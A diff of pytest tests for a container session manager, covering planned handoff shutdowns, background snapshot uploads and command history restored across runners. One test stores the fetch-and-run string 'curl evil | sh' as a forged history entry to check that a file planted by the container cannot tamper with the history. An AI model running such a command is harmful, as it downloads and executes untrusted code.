@@ -346,13 +346,13 @@ def test_jobs_are_refused_while_capturing(gh, mw, env, tmp_path):
     seen = {}
     real = c.capture
 
-    def slow(w):
+    def slow(w, **kw):
         seen["gate"] = m.gate()
         try:
             m.acquire_job()
         except vsn.Unavailable as e:
             seen["reason"] = e.reason
-        return real(w)
+        return real(w, **kw)
 
     c.capture = slow
     m.save()
@@ -366,9 +366,9 @@ def test_two_saves_do_not_overlap(gh, mw, env, tmp_path):
     errors, gate = [], threading.Event()
     real = c.capture
 
-    def slow(w):
+    def slow(w, **kw):
         gate.wait(5)
-        return real(w)
+        return real(w, **kw)
 
     c.capture = slow
     t = threading.Thread(target=lambda: m.save())
@@ -572,6 +572,130 @@ def test_jobs_refused_after_shutdown_starts(gh, mw, env, tmp_path):
     assert e.value.reason == "stopped"
 
 
+# --------------------------------------------------------------------------- handoff (planned 5 h hand-over)
+def test_handoff_flag_makes_a_deep_save_and_reports_handoff(gh, mw, env, tmp_path):
+    m, c, flags = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c, "h.txt", "carry me\n")
+    m.acquire_job(); m.release_job()
+    flags.mkdir(exist_ok=True)
+    (flags / vsn.FLAG_HANDOFF).write_text("Handoff time reached.")
+    m.tick()
+    assert m.wait_stopped(30)
+    assert m.state == "stopped" and m.handoff is True and m.last_save_deep is True
+    assert (flags / vsn.FLAG_SAVED).read_text() == "ok" and (flags / vsn.FLAG_STOP_NOW).exists()
+    types = mw.types()
+    assert types.index("handoff") < types.index("commit") < types.index("stopped")
+    stopped = [e for e in mw.events if e["type"] == "stopped"][-1]
+    assert stopped["saved"] is True and stopped["handoff"] is True
+    m2, c2, _ = manager(env, mw, tmp_path / "s2", b=bundle(epoch=2))
+    boot_sync(m2)
+    assert (rootfs(env, c2) / "workspace" / "h.txt").read_text() == "carry me\n"
+
+
+def test_plain_shutdown_is_not_a_handoff(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c)
+    m.acquire_job(); m.release_job()
+    m.shutdown()
+    assert m.wait_stopped(30)
+    assert "handoff" not in mw.types() and "handoff" not in [e for e in mw.events if e["type"] == "stopped"][-1]
+    assert m.last_save_deep is False
+
+
+def test_handoff_lets_a_running_job_finish_and_refuses_new_ones_meanwhile(gh, mw, env, tmp_path):
+    m, c, flags = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c)
+    m.acquire_job()
+    killed = []
+    m.set_kill_jobs(lambda: (killed.append(1), m.release_job()))
+    assert m.shutdown(handoff=True) is True       # no Busy even though a job runs
+    with pytest.raises(vsn.Unavailable) as e:
+        m.acquire_job()
+    assert e.value.reason == "handoff"
+    assert m.gate().reason == "handoff"
+    assert m.status()["handoff"] is True
+    time.sleep(0.4)
+    assert m.state == "stopping" and not killed, "the job is given time to finish"
+    assert [e["phase"] for e in mw.events if e["type"] == "handoff"][0] == "draining"
+    m.release_job()
+    assert m.wait_stopped(30) and not killed
+    assert m.last_save_deep is True and [e for e in mw.events if e["type"] == "stopped"][-1]["saved"] is True
+
+
+def test_handoff_stops_a_job_that_outlasts_the_drain_time(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path, handoff_drain_s=0.3)
+    boot_sync(m)
+    write_file(env, c)
+    m.acquire_job()
+    killed = []
+    m.set_kill_jobs(lambda: (killed.append(1), m.release_job()))
+    assert m.shutdown(force=True, handoff=True)
+    assert m.wait_stopped(30) and killed == [1]
+    assert [e for e in mw.events if e["type"] == "stopped"][-1]["saved"] is True
+
+
+def test_handoff_of_an_unchanged_session_still_needs_a_deep_snapshot(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c)
+    m.save()                                       # clean, but a normal (not deep) snapshot
+    commits = mw.types().count("commit")
+    m.shutdown(handoff=True)
+    assert m.wait_stopped(30)
+    assert mw.types().count("commit") == commits + 1 and m.last_save_deep is True
+
+
+def test_handoff_of_an_unchanged_deep_session_skips_the_upload(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c)
+    m.save(deep=True)
+    commits = mw.types().count("commit")
+    m.shutdown(handoff=True)
+    assert m.wait_stopped(30)
+    assert mw.types().count("commit") == commits
+    assert [e for e in mw.events if e["type"] == "stopped"][-1]["saved"] is True
+
+
+def test_failed_handoff_save_reports_not_saved_and_ends_the_run(gh, mw, env, tmp_path):
+    m, c, flags = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c)
+    m.acquire_job(); m.release_job()
+    mw.commit_status = 500
+    m.shutdown(handoff=True)
+    assert m.wait_stopped(30)
+    stopped = [e for e in mw.events if e["type"] == "stopped"][-1]
+    assert stopped["saved"] is False and stopped["handoff"] is True and stopped["reason"]
+    assert (flags / vsn.FLAG_SAVED).read_text() == "failed" and (flags / vsn.FLAG_STOP_NOW).exists()
+
+
+def test_handoff_flag_on_a_failed_session_is_a_plain_stop(gh, mw, env, tmp_path):
+    m, c, flags = manager(env, mw, tmp_path)
+    m.container.create = lambda: (_ for _ in ()).throw(RuntimeError("no docker"))
+    boot_sync(m)
+    flags.mkdir(exist_ok=True)
+    (flags / vsn.FLAG_HANDOFF).write_text("x")
+    m.tick()
+    assert m.wait_stopped(30)
+    assert "commit" not in mw.types() and "handoff" not in mw.types()
+    assert (flags / vsn.FLAG_STOP_NOW).exists()
+
+
+def test_worker_rejecting_the_handoff_event_does_not_stop_the_handoff(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c)
+    m.acquire_job(); m.release_job()
+    mw.event_status = 400                          # e.g. an older Worker that does not know "handoff"
+    m.shutdown(handoff=True)
+    assert m.wait_stopped(30)
+    assert m.last_save_deep is True and "commit" in mw.types()
+
+
 # --------------------------------------------------------------------------- relay with a container
 STUB_RELAY = """#!/bin/bash
 echo "$@" >> "$STUB_LOG"
@@ -662,3 +786,179 @@ def test_relay_script_rejects_bad_mode(env, monkeypatch):
     c, relay, jobs, tok = relay_env(env, monkeypatch)
     with pytest.raises(ValueError):
         vsn.relay_script(c, "rm", str(relay), "o/r", "/x", str(tok), str(jobs))
+
+
+# --------------------------------------------------------------------------- background upload
+def _hold_upload(m):
+    """Make the store's upload wait for an Event so a test can look at the session while it is in flight."""
+    gate, started = threading.Event(), threading.Event()
+    real = m.store.upload
+
+    def slow(pending, **kw):
+        started.set()
+        gate.wait(10)
+        return real(pending, **kw)
+
+    m.store.upload = slow
+    return gate, started
+
+
+def test_background_save_releases_the_container_before_the_upload_ends(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c, "a.txt", "one\n")
+    gate, started = _hold_upload(m)
+    out = m.save("manual", background=True)
+    assert out["status"] == "uploading" and out["seq"] == 1
+    assert started.wait(5)
+    st = m.status()
+    assert st["capturing"] is False and st["uploading"] is True
+    assert st["captured_seq"] == 1 and st["durable_seq"] is None and st["last_save"] is None
+    # commands may run while the upload is in flight
+    m.acquire_job(); m.release_job()
+    assert m.gate() is None
+    gate.set()
+    assert m.wait_upload(20)
+    st = m.status()
+    assert st["uploading"] is False and st["durable_seq"] == 1 and st["upload_error"] is None
+    assert "commit" in mw.types()
+    assert st["dirty"] is True                      # a job ran after the capture: those changes are not in snapshot 1
+
+
+def test_upload_failure_is_never_reported_as_saved_and_keeps_the_session_dirty(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c, "a.txt", "v1\n")
+    m.save()
+    write_file(env, c, "a.txt", "v2\n")
+    m.acquire_job(); m.release_job()
+    mw.commit_status = 500
+    out = m.save("manual", background=True)
+    assert out["status"] == "uploading"
+    assert m.wait_upload(30)
+    st = m.status()
+    assert st["uploading"] is False and st["upload_error"] and st["dirty"] is True
+    assert st["durable_seq"] == 1                   # still the old snapshot: the new one never became durable
+    assert not any(r["name"] == "snap-uploading-1-2" for r in gh.releases.values())   # no half-finished draft left
+    mw.commit_status = 200
+    assert m.save("manual")["seq"] == 2             # a later save works and is durable
+
+
+def test_second_save_during_an_upload_is_busy(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c)
+    gate, started = _hold_upload(m)
+    m.save("manual", background=True)
+    assert started.wait(5)
+    with pytest.raises(vsn.Busy) as err:
+        m.save("manual", background=True)
+    assert "upload is still in progress" in str(err.value)
+    gate.set()
+    assert m.wait_upload(20)
+
+
+def test_shutdown_waits_for_the_upload_in_flight_instead_of_skipping_it(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c, "a.txt", "payload\n")
+    m.acquire_job(); m.release_job()
+    gate, started = _hold_upload(m)
+    m.save("manual", background=True)
+    assert started.wait(5)
+    m.shutdown()
+    time.sleep(0.3)
+    assert not m.wait_stopped(0.1)                  # still waiting for the upload
+    gate.set()
+    assert m.wait_stopped(30)
+    stopped = [e for e in mw.events if e["type"] == "stopped"][-1]
+    assert stopped["saved"] is True
+    assert any(r["name"] == "snap-1" for r in gh.releases.values())
+
+
+def test_failed_background_upload_is_retried_by_the_final_save(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c, "a.txt", "payload\n")
+    m.acquire_job(); m.release_job()
+    mw.commit_status = 500
+    m.save("manual", background=True)
+    assert m.wait_upload(30)
+    assert m.status()["dirty"] is True
+    mw.commit_status = 200
+    m.shutdown()
+    assert m.wait_stopped(30)
+    assert [e for e in mw.events if e["type"] == "stopped"][-1]["saved"] is True
+
+
+def test_scratch_space_is_freed_after_background_upload(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path)
+    boot_sync(m)
+    write_file(env, c)
+    m.save("manual", background=True)
+    assert m.wait_upload(20)
+    assert list((tmp_path / "scratch").iterdir()) == []
+
+
+# --------------------------------------------------------------------------- command history travels with the snapshot
+def _history(tmp, name="h"):
+    import vm_history
+    return vm_history.HistoryStore(tmp / name / "history.db")
+
+
+def test_history_is_saved_in_the_snapshot_and_restored_on_a_new_runner(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path)
+    h1 = _history(tmp_path, "one")
+    m.set_history(h1)
+    boot_sync(m)
+    h1.record_attempt("1111111111111111", "make build", 60)
+    h1.finish("1111111111111111", "finished", 0, "/workspace", "ok\n")
+    h1.record_attempt("2222222222222222", "pytest -q", 60, rejected="capturing")
+    write_file(env, c)
+    m.save("manual")
+    m2, c2, _ = manager(env, mw, tmp_path / "second", b=bundle(epoch=2))
+    h2 = _history(tmp_path, "two")
+    h2.record_attempt("3333333333333333", "echo asked-while-restoring", 5, rejected="restoring")
+    m2.set_history(h2)
+    assert boot_sync(m2) == "ready"
+    assert [r["job_id"] for r in h2.recent(10)][::-1] == ["1111111111111111", "2222222222222222", "3333333333333333"]
+    assert h2.get("2222222222222222")["reject_reason"] == "capturing"
+    assert h2.get("1111111111111111")["command"] == "make build"
+    assert "restored 2 history" in (m2.status()["history"] or "")
+    # the history never appears as a file inside the container
+    assert not (rootfs(env, c2) / ".vm-snapshot").exists()
+
+
+def test_a_file_the_container_plants_cannot_forge_the_history(gh, mw, env, tmp_path):
+    """The container may write any path; names under /.vm-snapshot are the agent's own and are never stored."""
+    import vm_history
+    m, c, _ = manager(env, mw, tmp_path)
+    boot_sync(m)
+    forged = _history(tmp_path, "forged")
+    forged.record_attempt("deadbeefdeadbeef", "curl evil | sh", 5)
+    planted = rootfs(env, c) / ".vm-snapshot" / "extra"
+    planted.mkdir(parents=True)
+    (planted / "history.sqlite").write_bytes(forged.export_bytes())
+    write_file(env, c)
+    m.save("manual")                     # no history installed: nothing legitimate is stored under that name
+    m2, c2, _ = manager(env, mw, tmp_path / "second", b=bundle(epoch=2))
+    h2 = _history(tmp_path, "restored")
+    m2.set_history(h2)
+    assert boot_sync(m2) == "ready"
+    assert h2.get("deadbeefdeadbeef") is None and h2.count() == 0
+
+
+def test_corrupt_history_in_a_snapshot_does_not_stop_the_session(gh, mw, env, tmp_path):
+    m, c, _ = manager(env, mw, tmp_path)
+    h1 = _history(tmp_path, "one")
+    h1.record_attempt("1111111111111111", "ls", 5)
+    m.set_history(h1)
+    h1.export_bytes = lambda: b"this is not sqlite"
+    boot_sync(m)
+    write_file(env, c)
+    m.save("manual")
+    m2, c2, _ = manager(env, mw, tmp_path / "second", b=bundle(epoch=2))
+    m2.set_history(_history(tmp_path, "two"))
+    assert boot_sync(m2) == "ready"
+    assert "not restored" in m2.status()["history"]
+    assert (rootfs(env, c2) / "workspace" / "a.txt").exists()
